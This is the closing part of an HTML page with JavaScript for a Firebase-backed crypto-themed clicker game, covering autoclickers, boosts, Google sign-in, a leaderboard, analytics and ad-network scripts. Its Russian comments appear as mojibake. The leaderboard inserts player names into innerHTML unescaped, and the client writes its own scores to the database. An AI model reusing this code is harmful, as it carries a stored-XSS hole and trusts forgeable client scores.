      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      if (!achievements.level5 && currentLevel >= 5) {
        achievements.level5 = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Level 5 Reached! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }
    }

    function saveAchievements() {
      if (!user) return;
      db.ref("achievements/" + user.uid).set(achievements);
    }

    function toggleShop() {
      const shop = document.getElementById("shop");
      const btn = document.getElementById("shopBtn");
      const isCurrentlyOpen = shop.style.display === "block";

      closeAllPanels();

      shop.style.display = isCurrentlyOpen ? "none" : "block";
      btn.innerHTML = isCurrentlyOpen ? "Shop ‚ñº" : "Shop ‚ñ≤";
    }

  /*!  function startAutoclicker(duration) {
      if (autoclickActive) {
        const remainingTime = Math.max(0, autoclickEndTime - Date.now());
        autoclickEndTime = Date.now() + remainingTime + duration;
        clearInterval(autoclickInterval);
      } else {
        autoclickActive = true;
        autoclickEndTime = Date.now() + duration;
      }

      autoclickInterval = setInterval(() => clickToken(), 1000);
      autoclickerUses++;
      checkAchievements();

      updateProfilePanel();
      submitScore();

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: true,
          autoclickEndTime: autoclickEndTime,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error saving autoclicker state:", error);
        });
      }

      setTimeout(() => stopAutoclicker(), autoclickEndTime - Date.now());
    }!*/

    function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      // –ï—Å–ª–∏ –≤—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      stopAutoclicker();
    } else if (extendTime) {
      // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è –¥–ª—è –Ω–∞–≥—Ä–∞–¥—ã –∑–∞ –∑–∞–¥–∞–Ω–∏–µ
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      // –ó–∞–º–µ–Ω—è–µ–º —Ç–µ–∫—É—â–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–æ–≤—ã–º –≤—Ä–µ–º–µ–Ω–µ–º (–ø–æ–∫—É–ø–∫–∞ –∏–ª–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ)
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    // –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => clickToken(), 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á—ë—Ç—á–∏–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –Ω–æ–≤–æ–π –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ (–Ω–µ –ø—Ä–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–∏)
  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1); // –£—á–∏—Ç—ã–≤–∞–µ–º –∞–∫—Ç–∏–≤–∞—Ü–∏—é –¥–ª—è –∑–∞–¥–∞–Ω–∏—è
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}

  /*!  function stopAutoclicker() {
      clearInterval(autoclickInterval);
      autoclickActive = false;
      autoclickEndTime = 0;
      autoclickInterval = null;

      updateProfilePanel();
      submitScore();
      showMessage("Autoclicker deactivated.");

      autoclickCooldown = false;
    
      showMessage("Autoclicker available again.");

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error updating autoclicker state:", error);
        });
      }
    }!*/

    function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  autoclickInterval = null;
  autoclickCooldown = false;
  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: false,
      autoclickEndTime: 0,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error updating autoclicker state:", error);
    });
  }
}

   /*! function loadPlayerData(uid) {
      db.ref("leaderboard/" + uid).once("value").then(snapshot => {
        const data = snapshot.val();
        if (data) {
          score = data.score || 0;
          clickPower = data.clickPower || 1;
          autoclickActive = data.autoclickActive || false;
          autoclickEndTime = data.autoclickEndTime || 0;
          const lastUpdate = data.lastUpdate || 0;

          // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
          const tempBoostActive = data.tempBoostActive || false;
          const tempBoostEndTime = data.tempBoostEndTime || 0;
          const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
          const tempBoostAmount = data.tempBoostAmount || 0;

          if (tempBoostActive && tempBoostEndTime > Date.now()) {
            clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
            const remainingDuration = tempBoostEndTime - Date.now();
            originalClickPower = tempBoostOriginalClickPower;
            boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
          } else if (tempBoostActive) {
            clickPower = tempBoostOriginalClickPower;
            db.ref("leaderboard/" + uid).update({
              tempBoostActive: false,
              tempBoostEndTime: 0,
              tempBoostOriginalClickPower: 0,
              tempBoostAmount: 0,
              clickPower: clickPower,
              lastUpdate: Date.now()
            });
          }

          // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
          if (autoclickActive && autoclickEndTime > Date.now()) {
            const elapsedTime = Date.now() - lastUpdate;
            const secondsPassed = Math.floor(elapsedTime / 1000);
            const tokensEarned = secondsPassed * clickPower;
            if (tokensEarned > 0) {
              score += tokensEarned;
              showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
            }
            const remainingTime = autoclickEndTime - Date.now();
            startAutoclicker(remainingTime);
            document.getElementById("autoclickBtn").disabled = true;
          } else if (autoclickActive) {
            autoclickActive = false;
            autoclickEndTime = 0;
            db.ref("leaderboard/" + uid).update({
              autoclickActive: false,
              autoclickEndTime: 0
            });
            stopAutoclicker();
          }

          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          renderAchievements();
          updateClickPowerCostText();
        }

        // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
        if (user) {
          db.ref("leaderboard/" + uid).update({
            lastUpdate: Date.now()
          });
        }
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
        showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
      });

      db.ref("achievements/" + uid).once("value").then(snapshot => {
        const data = snapshot.val();
        if (data) {
          achievements = data;
          renderAchievements();
        }
      });
    }!*/

   /*!! function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();
        originalClickPower = tempBoostOriginalClickPower;
        boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}!!*/


    function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();
        // –ü–µ—Ä–µ–¥–∞—ë–º isRestoring = true –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –±—É—Å—Ç–∞
        boostClickPowerTemporarily(tempBoostAmount, remainingDuration, true);
      } else if (tempBoostActive) {
        // –ï—Å–ª–∏ –±—É—Å—Ç –∏—Å—Ç—ë–∫, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –µ–≥–æ
        clickPower = tempBoostOriginalClickPower;
        originalClickPower = null;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error clearing expired boost:", error);
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false);
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("Error loading player data:", error);
    showMessage("Failed to load data.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}

 /*!   function submitScore() {
      if (!user) return;
      const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
      db.ref("leaderboard/" + user.uid).set({
        id: user.uid,
        name: userName,
        score: score,
        clickPower: clickPower,
        autoclickActive: autoclickActive,
        autoclickEndTime: autoclickEndTime,
        tempBoostActive: !!tempBoostTimeout,
        tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
        tempBoostOriginalClickPower: originalClickPower || clickPower,
        tempBoostAmount: clickPower - (originalClickPower || clickPower),
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á—ë—Ç–∞:", error);
        showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
      });
    }!*/

    
function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? (Date.now() + (autoclickEndTime - Date.now())) : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: tempBoostTimeout ? (clickPower - (originalClickPower || clickPower)) : 0,
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("Error saving score:", error);
    showMessage("Failed to save progress.");
  });
}
    function buyUpgrade(type) {
      const cost = getClickPowerUpgradeCost();
      if (type === "clickPower") {
        if (clickPower >= 8) {
          showMessage("Click Power is at maximum!");
          return;
        }

        const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
        if (clickPower >= 3 && currentLevel < clickPower + 1) {
          showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
          const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
          buyButton.style.animation = "shake 0.3s";
          setTimeout(() => buyButton.style.animation = "", 300);
          return;
        }

        if (score >= cost) {
          score -= cost;
          clickPower++;
          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          updateClickPowerCostText();
          submitScore();
          showMessage("Click Power upgraded!");
        } else {
          showMessage("Not enough tokens for upgrade.");
        }
      }
    }

  /*!  function buyAutoclicker(minutes) {
      if (autoclickCooldown) {
        showMessage("Autoclicker on cooldown.");
        return;
      }

      const prices = {
        1: 200,
        5: 800,
        10: 1400
      };

      const cost = prices[minutes];
      if (score >= cost) {
        score -= cost;
        updateCounterDisplay();
        showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
        autoclickCooldown = true;
        autoclickActive = true;
        const duration = minutes * 60000;
        startAutoclicker(duration);
        updateTaskProgress("autoclickerMaster", 1);

        if (user) {
          db.ref("leaderboard/" + user.uid).update({
            autoclickActive: true,
            autoclickEndTime: autoclickEndTime,
            score: score,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("Error saving autoclicker purchase:", error);
          });
        }

        updateProfilePanel();
        submitScore();
      } else {
        showMessage("Not enough tokens for autoclicker.");
      }
    }!*/

function buyAutoclicker(minutes) {
  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 800,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
    const duration = minutes * 60000;
    startAutoclicker(duration, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –∑–∞–º–µ–Ω—ã –≤—Ä–µ–º–µ–Ω–∏
    updateTaskProgress("autoclickerMaster", 1);

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        score: score,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error saving autoclicker purchase:", error);
      });
    }

    updateProfilePanel();
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
}
    

    function signInWithGoogle() {
      const provider = new firebase.auth.GoogleAuthProvider();
      auth.signInWithPopup(provider).then(result => {
        user = result.user;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        submitScore();
      }).catch(error => {
        showMessage("Google sign-in failed.");
        console.error(error);
      });
    }

    function signOut() {
      if (user) {
        submitScore();
      }

      auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
      });
    }

  /*!  auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        checkDailyReward();
        renderTasks();
      }
    });!*/

    auth.onAuthStateChanged(currentUser => {
  if (currentUser) {
    user = currentUser;
    document.getElementById("authSection").style.display = "none";
    document.getElementById("gameSection").style.display = "block";
    loadPlayerData(user.uid);
    checkDailyReward();
    renderTasks();
    startBonusTimer(); // Initialize bonus timer on login
  } else {
    if (bonusTimerInterval) clearInterval(bonusTimerInterval);
    document.getElementById("claimBonusBtn").disabled = true;
    document.getElementById("bonusTimer").innerText = "Sign in to claim";
  }
});

    db.ref("leaderboard").on("value", snapshot => {
      const data = [];
      snapshot.forEach(child => {
        const entry = child.val();
        if (entry && entry.score !== undefined && entry.name) {
          data.push({
            id: entry.id,
            name: entry.name,
            score: entry.score
          });
        }
      });

      data.sort((a, b) => b.score - a.score);

      const leaderboard = document.getElementById("leaderboard");
      leaderboard.innerHTML = "";

      if (data.length === 0) {
        leaderboard.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
        return;
      }

      data.slice(0, 10).forEach((entry, index) => {
        leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
      });
    }, error => {
      console.error("Error loading leaderboard:", error);
      showMessage("Failed to load leaderboard.");
    });

    setInterval(() => {
      if (user) {
        updateProfilePanel();
        if (score > 0) submitScore();
      }
    }, 1000);

    const motivationalPhrases = [
      "Click ‚Äî earn tokens.", "Sign in ‚Äî save your progress.", "Your crypto journey starts here.",
      "No account ‚Äî no profit!", "Log in and turn clicks into income!", "The first tokens are always the most valuable.",
      "Top farmers are waiting for you!", "Level up ‚Äî earn even more tokens!", "Crypto wealth starts with a single click.",
      "Skip signing in ‚Äî miss the rewards!"
    ];

    let motiveIndex = 0;
    const motiveElement = document.getElementById("motiveText");

    setInterval(() => {
      motiveElement.style.opacity = 0;
      setTimeout(() => {
        motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
        motiveElement.innerText = motivationalPhrases[motiveIndex];
        motiveElement.style.opacity = 1;
      }, 500);
    }, 3000);
  </script>

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-G76GTQQKG0');
  </script>

  <div class="ad-container">
    <script type="text/javascript">
      atOptions = {
        'key': '37256add668a0f644adfae7b41a567a3',
        'format': 'iframe',
        'height': 90,
        'width': 728,
        'params': {}
      };
    </script>
    <script type="text/javascript" src="//www.highperformanceformat.com/37256add668a0f644adfae7b41a567a3/invoke.js"></script>
  </div>

  <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/rslite_bot/rsl_app?startapp=RZ8CSrP" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Free Game and Bonus
    </a>
  </div>
</body>
</html>
